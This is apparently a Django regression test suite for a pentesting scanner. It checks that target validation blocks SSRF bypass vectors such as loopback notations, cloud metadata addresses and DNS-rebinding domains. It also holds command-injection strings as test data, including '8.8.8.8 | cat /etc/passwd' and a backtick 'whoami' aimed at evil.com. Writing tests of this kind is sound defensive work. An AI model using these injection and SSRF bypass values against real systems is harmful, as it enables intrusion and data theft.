"""SSRF regression tests — ensure target validation blocks all bypass vectors."""

from django.test import TestCase
from rest_framework.exceptions import ValidationError as DRFValidationError

from scanner.serializers import ScanCreateSerializer


class SsrfRegressionTests(TestCase):
    """Regression suite for SSRF validation in ScanCreateSerializer."""

    def _assert_blocked(self, target):
        s = ScanCreateSerializer(data={"target": target})
        with self.assertRaises(DRFValidationError):
            s.is_valid(raise_exception=True)

    def _assert_allowed(self, target):
        s = ScanCreateSerializer(data={"target": target})
        s.is_valid(raise_exception=True)
        return s.validated_data["target"]

    # ── Loopback variants ──

    def test_blocks_127_0_0_1(self):
        self._assert_blocked("127.0.0.1")

    def test_blocks_127_255_255_255(self):
        self._assert_blocked("127.255.255.255")

    def test_blocks_localhost(self):
        self._assert_blocked("localhost")

    def test_blocks_zero_ip(self):
        self._assert_blocked("0.0.0.0")

    # ── Link-local / cloud metadata ──

    def test_blocks_cloud_metadata(self):
        self._assert_blocked("169.254.169.254")

    def test_blocks_link_local_range(self):
        self._assert_blocked("169.254.0.0/16")

    def test_blocks_link_local_arbitrary(self):
        self._assert_blocked("169.254.42.42")

    # ── Private ranges (allowed — this is a pentesting tool) ──

    def test_allows_10_x(self):
        self._assert_allowed("10.0.0.1")

    def test_allows_172_16_x(self):
        self._assert_allowed("172.16.0.1")

    def test_allows_172_31_x(self):
        self._assert_allowed("172.31.255.255")

    def test_allows_192_168_x(self):
        self._assert_allowed("192.168.1.1")

    # ── Alternative IP notations ──

    def test_blocks_hex_loopback(self):
        self._assert_blocked("0x7f000001")

    def test_blocks_decimal_loopback(self):
        self._assert_blocked("2130706433")

    def test_blocks_octal_loopback(self):
        self._assert_blocked("0177.0.0.01")

    def test_blocks_short_form_two_parts(self):
        self._assert_blocked("127.1")

    def test_blocks_short_form_three_parts(self):
        self._assert_blocked("127.0.1")

    # ── DNS rebinding domains ──

    def test_blocks_nip_io(self):
        self._assert_blocked("127.0.0.1.nip.io")

    def test_blocks_xip_io(self):
        self._assert_blocked("10.0.0.1.xip.io")

    def test_blocks_sslip_io(self):
        self._assert_blocked("192.168.1.1.sslip.io")

    def test_blocks_localtest_me(self):
        self._assert_blocked("localtest.me")

    # ── Multicast / reserved ──

    def test_blocks_multicast(self):
        self._assert_blocked("224.0.0.1")

    # ── Command injection via target ──

    def test_blocks_semicolon_injection(self):
        self._assert_blocked("example.com; whoami")

    def test_blocks_pipe_injection(self):
        self._assert_blocked("8.8.8.8 | cat /etc/passwd")

    def test_blocks_backtick_injection(self):
        self._assert_blocked("`whoami`.evil.com")

    def test_blocks_url_format(self):
        self._assert_blocked("http://example.com")

    # ── Valid targets pass ──

    def test_allows_public_ipv4(self):
        self._assert_allowed("8.8.8.8")

    def test_allows_public_hostname(self):
        self._assert_allowed("scanme.nmap.org")

    def test_allows_cidr_notation(self):
        self._assert_allowed("203.0.113.0/24")
